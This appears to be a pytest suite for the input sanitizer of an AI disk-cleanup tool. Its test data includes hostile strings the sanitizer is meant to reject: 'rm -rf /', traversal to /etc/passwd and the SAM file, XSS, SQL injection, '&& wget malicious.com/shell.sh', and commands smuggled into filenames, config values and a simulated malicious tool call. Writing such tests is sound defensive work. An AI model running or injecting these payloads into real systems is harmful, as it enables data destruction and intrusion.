"""
Comprehensive security tests for input sanitization and validation.

Tests injection prevention, pattern validation, and security event logging.
"""

import pytest
from datetime import datetime
from pathlib import Path

from src.ai_disk_cleanup.security.input_sanitizer import (
    InputSanitizer, ValidationResult, ValidationSeverity, get_sanitizer
)
from src.ai_disk_cleanup.security.validation_schemas import (
    CONFIG_SCHEMA, USER_PREFERENCE_SCHEMA, FILE_METADATA_SCHEMA
)


class TestInputSanitizer:
    """Test suite for InputSanitizer class."""

    @pytest.fixture
    def sanitizer(self):
        """Create a sanitizer instance for testing."""
        return InputSanitizer(strict_mode=True)

    @pytest.fixture
    def normal_sanitizer(self):
        """Create a non-strict sanitizer for testing."""
        return InputSanitizer(strict_mode=False)

    def test_filename_sanitization_safe_inputs(self, sanitizer):
        """Test filename sanitization with safe inputs."""
        safe_filenames = [
            "document.txt",
            "file_name-123.pdf",
            "my_data.csv",
            "script.py",
            "config.json"
        ]

        for filename in safe_filenames:
            result = sanitizer.sanitize_filename(filename)
            assert result.is_valid, f"Safe filename '{filename}' should be valid"
            assert result.sanitized_value == filename, f"Safe filename should not be modified"
            assert len(result.security_events) == 0

    def test_filename_sanitization_dangerous_inputs(self, sanitizer):
        """Test filename sanitization with dangerous inputs."""
        dangerous_inputs = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "file<script>alert('xss')</script>.txt",
            "file|rm -rf|.txt",
            "CON",  # Windows reserved name
            "file\x00null.txt",  # Null byte injection
            "very_long_filename_" + "a" * 300,  # Overly long
            "file.exe",  # Dangerous extension
        ]

        for filename in dangerous_inputs:
            result = sanitizer.sanitize_filename(filename)
            if filename == "very_long_filename_" + "a" * 300:
                # Long filenames should be truncated but valid
                assert result.is_valid, f"Long filename should be truncated and valid"
                assert len(result.sanitized_value) <= 255
            else:
                # Dangerous filenames should be rejected in strict mode
                assert not result.is_valid, f"Dangerous filename '{filename}' should be rejected"
            assert len(result.security_events) > 0, f"Should have security events for '{filename}'"

    def test_filename_sanitization_normal_mode(self, normal_sanitizer):
        """Test filename sanitization in normal mode."""
        dangerous_inputs = [
            "file<script>.txt",
            "file|rm|.txt",
            "file.exe"
        ]

        for filename in dangerous_inputs:
            result = normal_sanitizer.sanitize_filename(filename)
            # In normal mode, should be sanitized but might still be valid
            assert result.sanitized_value != filename, "Dangerous filename should be sanitized"
            assert len(result.security_events) > 0, "Should have security warnings"

    def test_path_sanitization_safe_paths(self, sanitizer):
        """Test path sanitization with safe paths."""
        safe_paths = [
            "/home/user/documents",
            "C:\\Users\\User\\Documents",
            "/tmp/data.txt",
            "relative/path/file.txt",
            "./subdirectory/file"
        ]

        for path in safe_paths:
            result = sanitizer.sanitize_file_path(path)
            assert result.is_valid, f"Safe path '{path}' should be valid"
            assert len(result.security_events) == 0

    def test_path_sanitization_dangerous_paths(self, sanitizer):
        """Test path sanitization with dangerous paths."""
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "/etc/passwd\x00.txt",  # Null byte injection
            "C:\\path\\with<script>injection.txt",
            "/path/with|rm -rf|/command"
        ]

        for path in dangerous_paths:
            result = sanitizer.sanitize_file_path(path)
            if ".." in path:
                # Path traversal should be rejected in strict mode
                assert not result.is_valid, f"Path traversal '{path}' should be rejected"
            assert len(result.security_events) > 0, f"Should have security events for '{path}'"

    def test_metadata_field_sanitization(self, sanitizer):
        """Test metadata field sanitization."""
        # Test safe metadata
        safe_metadata = {
            'path': '/home/user/document.txt',
            'name': 'document.txt',
            'size_bytes': 1024,
            'is_hidden': False,
            'tags': ['work', 'important']
        }

        for field_name, field_value in safe_metadata.items():
            result = sanitizer.sanitize_metadata_field(field_name, field_value)
            assert result.is_valid, f"Safe metadata field '{field_name}' should be valid"
            assert result.sanitized_value == field_value

        # Test dangerous metadata
        dangerous_metadata = [
            ('path', '../../../etc/passwd'),
            ('name', 'file<script>alert("xss")</script>.txt'),
            ('content', 'rm -rf /'),  # This should be caught as dangerous field name
            ('tags', ['safe', '<script>alert("xss")</script>'])
        ]

        for field_name, field_value in dangerous_metadata:
            result = sanitizer.sanitize_metadata_field(field_name, field_value)
            if field_name == 'content':
                # Content field name should be rejected
                assert not result.is_valid, f"Dangerous field name '{field_name}' should be rejected"
            else:
                # Dangerous values should be handled appropriately
                if field_name == 'tags' and isinstance(field_value, list):
                    # Lists should be processed element by element
                    assert len(result.security_events) > 0, "Should detect dangerous content in list"
                else:
                    assert len(result.security_events) > 0, f"Should detect dangerous content in '{field_name}'"

    def test_api_response_validation(self, sanitizer):
        """Test API response schema validation."""
        # Valid API response
        valid_response = {
            'choices': [
                {
                    'index': 0,
                    'message': {
                        'role': 'assistant',
                        'content': 'Analysis complete',
                        'tool_calls': [
                            {
                                'id': 'call_123abc',
                                'type': 'function',
                                'function': {
                                    'name': 'analyze_files_for_cleanup',
                                    'arguments': '{"file_analyses": []}'
                                }
                            }
                        ]
                    }
                }
            ],
            'usage': {
                'prompt_tokens': 100,
                'completion_tokens': 50
            },
            'id': 'resp_123',
            'object': 'chat.completion',
            'created': 1234567890,
            'model': 'gpt-4'
        }

        result = sanitizer.validate_api_response_schema(valid_response, {
            'choices': {'type': 'array', 'required': True},
            'usage': {'type': 'object', 'required': False},
            'id': {'type': 'string', 'required': False},
            'object': {'type': 'string', 'required': False},
            'created': {'type': 'integer', 'required': False},
            'model': {'type': 'string', 'required': False}
        })

        assert result.is_valid, "Valid API response should pass validation"
        assert len(result.security_events) == 0

        # Invalid API response
        invalid_responses = [
            {},  # Missing required choices
            {'choices': 'not_array'},  # Wrong type
            {'choices': [{'index': 'not_integer'}]},  # Invalid field type
            {'choices': [{'index': 0, 'message': None}]},  # Missing required fields
            {'choices': [{'index': 999999}]},  # Out of range value
        ]

        for response in invalid_responses:
            result = sanitizer.validate_api_response_schema(response, {
                'choices': {'type': 'array', 'required': True, 'min_length': 1, 'max_length': 10}
            })
            assert not result.is_valid, f"Invalid response {response} should fail validation"
            assert len(result.security_events) > 0

    def test_config_value_sanitization(self, sanitizer):
        """Test configuration value sanitization."""
        # Valid config values
        valid_configs = [
            ('api_key', 'sk-1234567890abcdef1234567890abcdef12345678'),
            ('model_name', 'gpt-4'),
            ('max_tokens', 1000),
            ('temperature', 0.7),
            ('timeout_seconds', 30),
            ('cache_enabled', True),
            ('log_level', 'INFO')
        ]

        for key, value in valid_configs:
            result = sanitizer.sanitize_config_value(key, value, CONFIG_SCHEMA)
            assert result.is_valid, f"Valid config '{key}': {value} should be valid"
            assert result.sanitized_value == value

        # Invalid config values
        invalid_configs = [
            ('api_key', 'invalid_key_format'),
            ('model_name', 'model<script>alert("xss")</script>'),
            ('max_tokens', -1),  # Below minimum
            ('max_tokens', 200000),  # Above maximum
            ('temperature', 3.0),  # Above maximum
            ('timeout_seconds', 'not_integer'),
            ('log_level', 'INVALID_LEVEL')
        ]

        for key, value in invalid_configs:
            result = sanitizer.sanitize_config_value(key, value, CONFIG_SCHEMA)
            assert not result.is_valid, f"Invalid config '{key}': {value} should be rejected"
            assert len(result.security_events) > 0

    def test_user_input_sanitization(self, sanitizer):
        """Test user input sanitization."""
        # Safe user inputs
        safe_inputs = [
            "Please analyze files in /home/user/Documents",
            "Find temporary files and logs",
            "Look for files larger than 100MB",
            "Show me files older than 30 days"
        ]

        for user_input in safe_inputs:
            result = sanitizer.sanitize_user_input(user_input)
            assert result.is_valid, f"Safe user input should be valid: {user_input}"
            assert result.sanitized_value == user_input

        # Dangerous user inputs
        dangerous_inputs = [
            "rm -rf /",  # Command injection
            "<script>alert('xss')</script>",  # XSS
            "../../etc/passwd",  # Path traversal
            "'; DROP TABLE users; --",  # SQL injection
            "password=secret123",  # Potential credential leakage
            "exec('malicious_code')",  # Code execution
            "a" * 20000  # Overly long input
        ]

        for user_input in dangerous_inputs:
            result = sanitizer.sanitize_user_input(user_input)
            if len(user_input) > 10000:
                # Long inputs should be truncated
                assert len(result.sanitized_value) <= 10000
            else:
                # Dangerous inputs should be rejected in strict mode
                assert not result.is_valid, f"Dangerous user input should be rejected: {user_input}"
            assert len(result.security_events) > 0

    def test_injection_pattern_detection(self, sanitizer):
        """Test specific injection pattern detection."""
        injection_patterns = [
            # SQL Injection
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "UNION SELECT * FROM passwords",
            "'; exec xp_cmdshell('dir'); --",

            # Command Injection
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& wget malicious.com/shell.sh",

            # XSS
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "onload=alert('xss')",

            # Path Traversal
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",

            # File System
            "/dev/null",
            "CON",  # Windows reserved
            "PRN",
            "AUX"
        ]

        for pattern in injection_patterns:
            result = sanitizer.sanitize_user_input(pattern)
            assert not result.is_valid, f"Injection pattern should be detected: {pattern}"
            assert len(result.security_events) > 0
            assert any("injection" in event.lower() or "traversal" in event.lower()
                      for event in result.security_events)

    def test_security_event_logging(self, sanitizer):
        """Test security event logging functionality."""
        # Generate some security events
        sanitizer.sanitize_filename("../../../etc/passwd")
        sanitizer.sanitize_user_input("<script>alert('xss')</script>")
        sanitizer.sanitize_config_value("api_key", "invalid", CONFIG_SCHEMA)

        # Check security summary
        summary = sanitizer.get_security_summary()
        assert summary['total_events'] > 0
        assert summary['error_events'] > 0
        assert len(summary['recent_events']) > 0
        assert summary['strict_mode'] == True

        # Clear events
        sanitizer.clear_security_events()
        summary = sanitizer.get_security_summary()
        assert summary['total_events'] == 0
        assert summary['error_events'] == 0
        assert len(summary['recent_events']) == 0

    def test_nested_data_structures(self, sanitizer):
        """Test sanitization of nested data structures."""
        nested_data = {
            'safe_key': 'safe_value',
            'nested_dict': {
                'inner_key': 'inner_value',
                'dangerous_key': '<script>alert("xss")</script>'
            },
            'nested_list': [
                'safe_item',
                '../../../etc/passwd',
                {'deep_key': 'deep_value'}
            ]
        }

        result = sanitizer.sanitize_metadata_field('test_field', nested_data)
        # In strict mode, any dangerous content should invalidate the entire structure
        assert not result.is_valid, "Nested structure with dangerous content should be invalid"
        assert len(result.security_events) > 0

    def test_performance_large_dataset(self, normal_sanitizer):
        """Test performance with large datasets."""
        import time

        # Create large dataset
        large_dataset = []
        for i in range(1000):
            large_dataset.append(f"file_{i}.txt")

        start_time = time.time()
        for filename in large_dataset:
            result = normal_sanitizer.sanitize_filename(filename)
            assert result.is_valid
        end_time = time.time()

        # Should process 1000 items in reasonable time (< 1 second)
        processing_time = end_time - start_time
        assert processing_time < 1.0, f"Performance test failed: {processing_time:.3f}s for 1000 items"

    def test_allowlist_validation(self, sanitizer):
        """Test allowlist-based validation approach."""
        # Test allowed extensions
        allowed_extensions = ['.txt', '.pdf', '.doc', '.jpg', '.png']
        for ext in allowed_extensions:
            filename = f"test{ext}"
            result = sanitizer.sanitize_filename(filename)
            assert result.is_valid, f"Allowed extension {ext} should be valid"

        # Test dangerous extensions
        dangerous_extensions = ['.exe', '.bat', '.cmd', '.scr', '.vbs']
        for ext in dangerous_extensions:
            filename = f"test{ext}"
            result = sanitizer.sanitize_filename(filename)
            assert not result.is_valid, f"Dangerous extension {ext} should be rejected"

    def test_cross_platform_paths(self, sanitizer):
        """Test path validation across different platforms."""
        unix_paths = [
            "/home/user/file.txt",
            "./relative/file.txt",
            "/tmp/../etc/passwd"  # Should be caught as traversal
        ]

        windows_paths = [
            "C:\\Users\\User\\file.txt",
            ".\\relative\\file.txt",
            "..\\..\\Windows\\System32\\config\\sam"  # Should be caught as traversal
        ]

        for path in unix_paths + windows_paths:
            result = sanitizer.sanitize_file_path(path)
            if '..' in path:
                assert not result.is_valid, f"Path with traversal should be rejected: {path}"
            else:
                assert result.is_valid, f"Valid path should be accepted: {path}"

    def test_get_sanitizer_function(self):
        """Test the get_sanitizer utility function."""
        # Test default sanitizer
        sanitizer1 = get_sanitizer()
        assert isinstance(sanitizer1, InputSanitizer)

        # Test strict mode
        strict_sanitizer = get_sanitizer(strict_mode=True)
        assert strict_sanitizer.strict_mode == True

        # Test normal mode
        normal_sanitizer = get_sanitizer(strict_mode=False)
        assert normal_sanitizer.strict_mode == False

        # Test caching behavior
        sanitizer2 = get_sanitizer()
        assert sanitizer1 is sanitizer2, "Should return same instance for same settings"


class TestIntegrationScenarios:
    """Integration tests for realistic security scenarios."""

    def test_real_world_api_response_validation(self):
        """Test validation of realistic API responses."""
        sanitizer = get_sanitizer(strict_mode=True)

        # Simulate a realistic but malicious API response
        malicious_response = {
            'choices': [
                {
                    'index': 0,
                    'message': {
                        'role': 'assistant',
                        'tool_calls': [
                            {
                                'id': 'call_injection<script>alert("xss")</script>',
                                'type': 'function',
                                'function': {
                                    'name': 'analyze_files_for_cleanup; rm -rf /',
                                    'arguments': '{"file_analyses":[{"path":"../../../etc/passwd","deletion_recommendation":"delete","reason":"<script>alert(\\"xss\\")</script>"}]}'
                                }
                            }
                        ]
                    }
                }
            ]
        }

        # This should fail validation due to injection patterns
        result = sanitizer.validate_api_response_schema(malicious_response, {
            'choices': {'type': 'array', 'required': True}
        })

        assert not result.is_valid, "Malicious API response should be rejected"
        assert len(result.security_events) > 0

    def test_config_import_security_scenario(self):
        """Test security scenario for configuration import."""
        sanitizer = get_sanitizer(strict_mode=True)

        # Simulate malicious configuration data
        malicious_config = {
            'api_key': 'sk-1234567890abcdef1234567890abcdef12345678',
            'model_name': 'gpt-4; rm -rf /',
            'max_tokens': 1000000,  # Excessive value
            'temperature': 10.0,  # Out of range
            'timeout_seconds': -1,  # Invalid negative value
            'log_level': 'DEBUG; DROP TABLE users; --'
        }

        # Validate each config value
        for key, value in malicious_config.items():
            result = sanitizer.sanitize_config_value(key, value, CONFIG_SCHEMA)
            assert not result.is_valid, f"Malicious config '{key}' should be rejected"
            assert len(result.security_events) > 0

    def test_file_metadata_batch_validation(self):
        """Test batch validation of file metadata."""
        sanitizer = get_sanitizer(strict_mode=True)

        # Mixed batch of safe and dangerous metadata
        metadata_batch = [
            {
                'path': '/home/user/safe_file.txt',
                'name': 'safe_file.txt',
                'size_bytes': 1024,
                'is_hidden': False
            },
            {
                'path': '../../../etc/passwd',
                'name': 'passwd',
                'size_bytes': 2048,
                'is_hidden': False
            },
            {
                'path': '/home/user/file<script>.txt',
                'name': 'file<script>.txt',
                'size_bytes': 512,
                'is_hidden': True
            }
        ]

        validation_results = []
        for i, metadata in enumerate(metadata_batch):
            for field_name, field_value in metadata.items():
                result = sanitizer.sanitize_metadata_field(f"file_{i}.{field_name}", field_value)
                validation_results.append(result)

        # First metadata should be valid
        safe_results = [r for r in validation_results[:4]]  # First 4 fields
        assert all(r.is_valid for r in safe_results), "Safe metadata should pass validation"

        # Dangerous metadata should have security events
        dangerous_results = validation_results[4:]  # Remaining fields
        assert any(not r.is_valid for r in dangerous_results), "Dangerous metadata should be rejected"
        assert all(len(r.security_events) > 0 for r in dangerous_results), "Should have security events"


if __name__ == '__main__':
    pytest.main([__file__])